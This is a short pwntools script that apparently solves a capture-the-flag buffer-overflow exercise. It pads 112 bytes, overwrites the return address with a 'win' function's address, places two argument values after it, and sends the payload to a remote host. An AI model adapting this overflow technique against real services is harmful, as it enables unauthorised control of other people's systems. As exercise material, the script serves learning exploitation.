#!/usr/bin/env python3

import argparse
import pwn

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The hostname or IP address to connect to")
parser.add_argument("port", type=int, help="The port to connect to")
args = parser.parse_args()

offset = 112
elf = pwn.ELF("./vuln")

new_eip = pwn.p32(elf.symbols["win"])
return_address = pwn.p32(elf.symbols["main"])

payload = b"".join(
	[
		b"A" * offset,
		new_eip,
		return_address,
		pwn.p32(0xCAFEF00D),
		pwn.p32(0xF00DF00D),
	]
)

p = pwn.remote(args.host, args.port)
p.send(payload + b"\n")
# p.interactive()
print(p.recv().decode("latin-1"))
